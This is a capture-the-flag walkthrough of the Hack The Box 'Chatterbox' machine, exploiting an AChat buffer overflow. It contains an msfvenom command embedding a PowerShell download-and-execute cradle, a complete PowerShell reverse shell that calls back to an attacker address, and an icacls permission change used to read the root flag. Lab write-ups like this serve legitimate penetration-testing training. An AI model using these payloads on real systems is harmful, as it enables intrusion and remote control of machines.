![logo](/logo.png)

# [Chatterbox- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 27 Jan 2018 machine on HTB,Chatterbox created by [lkys37en](https://app.hackthebox.com/users/709).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *steghide
  *Wordpress
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/chatterbox 10.10.10.74 -Pn
```

###### Output 

![](/Windows/Windows-Medium/Chatterbox/Screenshots/1nmap.png)

looking at this it does not find anything so next we scan for all ports

```sh
nmap -sV -sC -oA nmap/chatterbox 10.10.10.74 -Pn -p-
```


Nmap finds only AChat running on the machine.In general, TCP/9255 is Monitor on Network, and TCP/9256 is unassigned. That’s not terribly helpful. However, there are multiple references to `AChat` (for example, [here](https://www.speedguide.net/port.php?port=9256)), and there’s a [SEH-based stack buffer overflow](https://www.exploit-db.com/exploits/36025/) for it.

Using msfvenom, it is possible to generate shellcode for use in the above exploit.

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
```

![](/Windows/Windows-Medium/Chatterbox/Screenshots/msfvenom.png)

When working Windows hosts, I typically use the [Nishang](https://github.com/samratashok/nishang) `Invoke-PowerShellTcp.ps1` script to get a shell. We can do that pretty easily here by changing the command from simply launching calc to one that will invoke powershell and have it call to us to get the shell to execute:

```sh
#A simple and small reverse shell. Options and help removed to save space. 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

![](/Windows/Windows-Medium/Chatterbox/Screenshots/shellcode.png)
Put that output into the script, and run it: [AchatExploit](https://www.exploit-db.com/exploits/36025) the exploit below

![](/Windows/Windows-Medium/Chatterbox/Screenshots/vscodeshell.png)

![](/Windows/Windows-Medium/Chatterbox/Screenshots/exploit.png)

checking at the request we find that it has picked the file

![](/Windows/Windows-Medium/Chatterbox/Screenshots/listenning.png)

checking the listenning we get shell

![](/Windows/Windows-Medium/Chatterbox/Screenshots/shell.png)

you can get the `user.txt` in `Alfred`

![](/Windows/Windows-Medium/Chatterbox/Screenshots/userflag.png)

We don’t have read access to the file now:

```sh
icacls root.txt
```

![](/Windows/Windows-Medium/Chatterbox/Screenshots/icacls.png)

If we look at the directory for Desktop itself, Alfred actually has permissions on it:But, we can change that with `icacls`:

```sh
icacls root.txt /grant alfred:F
```

![](/Windows/Windows-Medium/Chatterbox/Screenshots/root.png)

then we find root after changing to `Alfred`

![](/Windows/Windows-Medium/Chatterbox/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------




